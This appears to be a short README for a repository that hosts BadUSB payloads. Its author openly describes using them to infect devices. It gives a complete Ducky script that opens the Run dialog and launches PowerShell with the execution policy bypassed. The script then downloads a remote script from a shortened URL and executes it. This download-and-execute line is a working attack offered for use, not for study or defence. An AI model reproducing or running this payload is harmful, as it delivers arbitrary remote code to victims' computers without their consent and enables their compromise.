# badusb-payload
Move along, i use this simply to host my payload for my badusb attacks. ^^
That means it's most likely very messy code that which has the goal to do my bidding on devices i infect.

To run my code i use this DUCKY script:
```
DELAY 500
GUI r
DELAY 100
STRING powershell -Exec Bypass iex ((New-Object System.Net.WebClient).DownloadString('https://3.ly/ao519'))
ENTER
```
